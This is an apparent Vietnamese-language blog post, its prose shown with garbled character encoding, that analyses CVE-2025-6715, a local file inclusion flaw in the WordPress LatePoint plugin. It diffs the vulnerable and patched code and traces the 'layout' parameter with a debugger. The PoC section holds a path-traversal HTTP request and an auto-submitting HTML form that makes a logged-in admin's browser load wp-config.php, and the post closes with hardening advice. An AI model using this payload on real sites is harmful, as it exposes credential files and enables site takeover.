# CVE-2025-6715 Analysis & POC


<!--more-->

## CVE & Basic Info
Plugin **LatePoint** phiÃªn báº£n **â‰¤ 5.1.93** chá»©a lá»— há»•ng **Local File Inclusion** cho phÃ©p káº» táº¥n cÃ´ng khÃ´ng cáº§n xÃ¡c thá»±c Ä‘iá»u khiá»ƒn tham sá»‘ file trong lá»‡nh `include/require`, tá»« Ä‘Ã³ chÃ¨n hoáº·c Ä‘á»c cÃ¡c tá»‡p cá»¥c bá»™ trÃªn mÃ¡y chá»§ (vÃ­ dá»¥ file cáº¥u hÃ¬nh chá»©a credential), dáº«n tá»›i rÃ² rá»‰ thÃ´ng tin nháº¡y cáº£m vÃ  trong má»™t sá»‘ cáº¥u hÃ¬nh cÃ³ thá»ƒ dáº«n tá»›i thá»±c thi mÃ£.

* **CVE ID**: [CVE-2025-6715](https://www.cve.org/CVERecord?id=CVE-2025-6715)
* **Vulnerability Type**: Local File Inclusion
* **Affected Versions**: <= 5.1.93
* **Patched Versions**: 5.1.94
* **CVSS severity**: High (8.1)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress LatePoint Plugin](https://wordpress.org/plugins/latepoint/)

## Requirements
* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **LatePoint**: **5.1.93** (vulnerable) vÃ  **5.1.94** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) hoáº·c báº¥t ká»³ cÃ´ng cá»¥ so sÃ¡nh (diff) nÃ o Ä‘á»ƒ kiá»ƒm tra vÃ  so sÃ¡nh khÃ¡c biá»‡t giá»¯a hai phiÃªn báº£n.

## Analysis

### Patch diff

**Báº£n lá»—i**:

```php { filename="controller.php v5.1.93" hl_lines=[8]}
function render($view, $layout = 'none', $extra_vars = array()){
    $this->vars['route_name'] = $this->route_name;
    extract($extra_vars);
    extract($this->vars);
    ob_start();
    if($layout != 'none'){
      // rendering layout, view variable will be passed and used in layout file
      include LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $this->add_extension($layout, '.php');
    }else{
      include $this->add_extension($view, '.php');
    }
    $response_html = ob_get_clean();
    return $response_html;
}
```

Trong phiÃªn báº£n lá»—i, hÃ m `render()` gáº¯n `.php` vÃ o `$layout` vÃ  `include` trá»±c tiáº¿p mÃ  khÃ´ng kiá»ƒm tra, dáº«n Ä‘áº¿n **Local File Inclusion (LFI)** náº¿u `$layout` bá»‹ kiá»ƒm soÃ¡t tá»« Ä‘áº§u vÃ o.

**Báº£n vÃ¡**:

```php { filename="controller.php v5.1.94" hl_lines=[7,10,21,23,26,29,36,37]}
function render($view, $layout = 'none', $extra_vars = array()){
    $this->vars['route_name'] = $this->route_name;
    extract($extra_vars);
    extract($this->vars);
    ob_start();
    if($layout != 'none'){
		$layout_path = $this->get_safe_layout_path($layout);
      // rendering layout, view variable will be passed and used in layout file
      if($layout_path){
		  include $layout_path;
      }else{
		  __('Invalid layout', 'latepoint');
      }
    }else{
      include $this->add_extension($view, '.php');
    }
    $response_html = ob_get_clean();
    return $response_html;
}

private function get_safe_layout_path($layout) {
    // 1. Remove any path separators and null bytes
    $layout = str_replace(['/', '\\', "\0"], '', $layout);

    // 2. Remove any dots to prevent directory traversal
    $layout = str_replace('.', '', $layout);

    // 3. Only allow alphanumeric, underscore, and hyphen
    $layout = preg_replace('/[^a-zA-Z0-9_-]/', '', $layout);

    // 4. Construct the full path
    $layout_file = $this->add_extension($layout, '.php');
    $full_path = LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $layout_file;

    // 5. Use realpath to resolve any remaining traversal attempts
    $real_path = realpath($full_path);
    $base_path = realpath(LATEPOINT_VIEWS_LAYOUTS_ABSPATH);

    // 6. Ensure the resolved path is within the layouts directory
    if ($real_path && $base_path && strpos($real_path, $base_path) === 0) {
        return $real_path;
    }

    return false;
}
```

Báº£n vÃ¡ Ä‘Ã£ thÃªm `get_safe_layout_path()` Ä‘á»ƒ loáº¡i bá» `/`, `\`, `.` vÃ  null byte; chá»‰ cho phÃ©p `[A-Za-z0-9_-]`; xÃ¢y dá»±ng Ä‘Æ°á»ng dáº«n, dÃ¹ng `realpath()` vÃ  so sÃ¡nh vá»›i `LATEPOINT_VIEWS_LAYOUTS_ABSPATH`. Náº¿u há»£p lá»‡ má»›i `include`, ngÄƒn cháº·n LFI.

### Vulnerable Code 

HÃ m `render()` Ä‘Æ°á»£c gá»i táº¡i **12 vá»‹ trÃ­ khÃ¡c nhau**, nÃªn viá»‡c **trace thá»§ cÃ´ng** sáº½ ráº¥t máº¥t thá»i gian.

{{< figure src="ref.png" caption="12 vá»‹ trÃ­ gá»i hÃ m `render()`" >}}

Äá»ƒ tá»‘i Æ°u, ta sá»­ dá»¥ng **debugger**:

* Äáº·t **breakpoint** trong hÃ m `render()`.
* Thá»±c hiá»‡n láº§n lÆ°á»£t cÃ¡c thao tÃ¡c trong giao diá»‡n (UI).
* Má»—i khi `render()` Ä‘Æ°á»£c gá»i, chÆ°Æ¡ng trÃ¬nh sáº½ **táº¡m dá»«ng táº¡i breakpoint** vÃ  **highlight** dÃ²ng code tÆ°Æ¡ng á»©ng, giÃºp xÃ¡c Ä‘á»‹nh nhanh luá»“ng gá»i hÃ m.

{{< figure src="scr.gif" caption="Video debugger nháº£y Ä‘áº¿n break point" >}}

ğŸ‘‰ Khi truy cáº­p endpoint `http://localhost/wp-admin/admin.php?page=latepoint&route_name=calendars__view` vá»›i route name lÃ  cÃ¡c submenu cá»§a plugin thÃ¬ `render()` Ä‘Æ°á»£c gá»i vá»›i layout máº·c Ä‘á»‹nh lÃ  `admin`

{{< figure src="default_layout.png" caption="Layout máº·c Ä‘á»‹nh" >}}

Quan sÃ¡t callstack, ta tháº¥y Ä‘Æ°á»£c luá»“ng gá»i hÃ m Ä‘áº¿n `render()`

{{< figure src="callstack.png" caption="Luá»“ng gá»i hÃ m trong callstack" >}}

```php { filename="controller.php v5.1.93" hl_lines=[11]}
function format_render_return($view_name, $extra_vars = array(), $json_return_vars = array(), $from_shared_folder = false){
  $html = '';
  if($this->get_return_format() == 'json'){
    if(is_array($view_name)) $view_name = $view_name['json_view_name'];
    $response_html = $this->render($this->get_view_uri($view_name, $from_shared_folder), 'none', $extra_vars);
    $this->send_json(array_merge(array('status' => LATEPOINT_STATUS_SUCCESS, 'message' => $response_html), $json_return_vars));
  }else{
    if(is_array($view_name)) $view_name = $view_name['html_view_name'];
    $this->extra_css_classes[] = $this->generate_css_class($view_name);
    $this->vars['extra_css_classes'] = $this->extra_css_classes;
    $html = $this->render($this->get_view_uri($view_name, $from_shared_folder), $this->get_layout(), $extra_vars);
  }
  return $html;
}
```

`render()` Ä‘Æ°á»£c `format_render_return()` gá»i khi `get_return_format()` khÃ´ng pháº£i lÃ  `json`, máº·c Ä‘á»‹nh nÃ³ lÃ  `html`

```php
$return_format = 'html'
...
function get_return_format(){
  return $this->return_format;
}
```

`layout` mÃ  ta cáº§n quan tÃ¢m lÃ  giÃ¡ trá»‹ tráº£ vá» cá»§a `get_layout()` => cÃ³ `get_layout()` thÃ¬ cÅ©ng sáº½ cÃ³ `set_layout()`, ta tÃ¬m vá»›i tá»« khÃ³a `set_layout` trong cÃ¹ng file Ä‘á»ƒ xem giÃ¡ trá»‹ `layout` Ä‘Æ°á»£c set nhÆ° nÃ o.

```php
$layout = 'admin'
...
function set_layout($layout = 'admin'){
  if(isset($this->params['layout'])){
    $this->layout = $this->params['layout'];
  }else{
    $this->layout = $layout;
  }
}
```

Biáº¿n `$layout` Ä‘Æ°á»£c gÃ¡n giÃ¡ trá»‹ máº·c Ä‘á»‹nh lÃ  **`'admin'`**, tÆ°Æ¡ng á»©ng vá»›i layout mÃ  ta Ä‘Ã£ phÃ¢n tÃ­ch trÆ°á»›c Ä‘Ã³.

HÃ m `set_layout()` cÃ³ nhiá»‡m vá»¥ xÃ¡c Ä‘á»‹nh layout sáº½ sá»­ dá»¥ng:
* Náº¿u trong `$this->params` cÃ³ tá»“n táº¡i tham sá»‘ `layout`, thÃ¬ hÃ m sáº½ dÃ¹ng giÃ¡ trá»‹ Ä‘Ã³.
* NgÆ°á»£c láº¡i, náº¿u khÃ´ng cÃ³, nÃ³ sáº½ gÃ¡n layout máº·c Ä‘á»‹nh (`'admin'`).

Ta tiáº¿p tá»¥c táº­n dá»¥ng sá»©c máº¡nh cá»§a **debugger**, quan sÃ¡t biáº¿n `$params`

{{< figure src="params.png" caption="GiÃ¡ trá»‹ cá»§a `$params`" >}}

`$params` bao gá»“m 2 key lÃ  `page` vÃ  `route_name` tÆ°Æ¡ng Ä‘Æ°Æ¡ng vá»›i params string khi ta truy cáº­p endpoint `http://localhost/wp-admin/admin.php?page=latepoint&route_name=calendars__view` 

ğŸ‘‰ NhÆ° váº­y `layout` cÅ©ng lÃ  param Ä‘Æ°á»£c truyá»n trong URL, ta táº­n dá»¥ng Ä‘iá»u nÃ y Ä‘á»ƒ khai thÃ¡c.

Thá»­ truy cáº­p endpoint trÃªn vá»›i `layout` param

```http
GET /wp-admin/admin.php?page=latepoint&route_name=calendars__view&layout=payload HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost/wp-admin/admin.php?page=latepoint
Connection: keep-alive
Cookie: wordpress_86a9106ae65537651a8e456835b316ab=admin%7C1760967480%7CoCVvKc0bJQfyBklDsH6H9DopdAB5cs1Sto11eNkRdYj%7Cc08cb50e24c24f218212642e90eebec4ec8ab1c3fb72a2443f62f3c27e253edd; wp-settings-time-1=1760795495; language=en; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1760967480%7CoCVvKc0bJQfyBklDsH6H9DopdAB5cs1Sto11eNkRdYj%7C2e46c824d8ba0f581459540ee6553fac38b1af797e42b03957dd3ab2a79a4175
```

`$layout` Ä‘Ã£ Ä‘Æ°á»£c ta hoÃ n toÃ n kiá»ƒm soÃ¡t

{{< figure src="layout.png" caption="`$layout` Ä‘Æ°á»£c kiá»ƒm soÃ¡t" >}}

## Exploit
### Proof of Concept (PoC)

#### Step 1

Táº¡o trang web cÃ³ form, tá»± Ä‘á»™ng gá»­i request vá»›i LFI payload

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <form action="http://localhost:80/wp-admin/admin.php" method="get">
        <input type="text" name="page" value="latepoint">
        <input type="text" name="route_name" value="calendars__view">
        <input type="text" name="layout" value="../../../../../../wp-config">
    </form>
    <script>
        document.forms[0].submit()
    </script>
</body>
</html>
```

#### Step 2
Gá»­i link Ä‘áº¿n trang web cho admin hoáº·c ngÆ°á»i dÃ¹ng cÃ³ Ä‘áº·c quyá»n

**Result**:

Debugger Ä‘Ã£ nháº£y Ä‘áº¿n `wp-config.php`

{{< figure src="result.png" caption="Káº¿t quáº£ LFI thÃ nh cÃ´ng" >}}

> [!INFO]
> VÃ¬ Ä‘Ã¢y lÃ  CVE Ä‘Æ°á»£c cÃ´ng bá»‘ **Unauthenticated**, nÃªn ta táº­n dá»¥ng plugin khÃ´ng check `nonce` Ä‘á»ƒ ngÆ°á»i dÃ¹ng Ä‘Ã£ Ä‘Äƒng nháº­p truy cáº­p vÃ o link trang web Ä‘á»™c háº¡i rá»“i tá»± gá»­i request Ä‘áº¿n trang WordPress Ä‘Ã³ kÃ¨m theo cookie. 

### Conclusion

PhiÃªn báº£n **â‰¤ 5.1.93** cá»§a LatePoint cho phÃ©p **LFI** vÃ¬ tham sá»‘ `layout` khÃ´ng Ä‘Æ°á»£c xÃ¡c thá»±c trÆ°á»›c khi `include()`, dáº«n tá»›i kháº£ nÄƒng **Ä‘á»c tá»‡p cá»¥c bá»™** (vÃ­ dá»¥ `wp-config.php`). Lá»— há»•ng Ä‘Æ°á»£c vÃ¡ trong **5.1.94** báº±ng cÃ¡ch lá»c kÃ½ tá»±, dÃ¹ng `realpath()` vÃ  giá»›i háº¡n thÆ° má»¥c há»£p lá»‡.

### Key takeaways

* ÄÃ¢y lÃ  **LFI (Ä‘á»c file)** â€” khÃ´ng cÃ³ báº±ng chá»©ng RCE trong PoC.
* Tham sá»‘ Ä‘iá»u khiá»ƒn Ä‘Æ°á»ng dáº«n pháº£i Ä‘Æ°á»£c **sanitize + canonicalize** trÆ°á»›c khi dÃ¹ng.
* DÃ¹ng **realpath()** vÃ  **kiá»ƒm tra base dir** Ä‘á»ƒ ngÄƒn traversal.
* KhÃ´ng **include** trá»±c tiáº¿p dá»¯ liá»‡u tá»« request; xÃ¢y hÃ m an toÃ n nhÆ° `get_safe_layout_path()`.

## References

[File Inclusion/Path traversal â€” Hacktrick](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols)

[ WordPress LatePoint Plugin <= 5.1.93 is vulnerable to Local File Inclusion ](https://patchstack.com/database/wordpress/plugin/latepoint/vulnerability/wordpress-latepoint-plugin-5-1-94-unauthenticated-lfi-vulnerability)

---

> TÃ¡c giáº£: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-10-19-cve-2025-6715/  

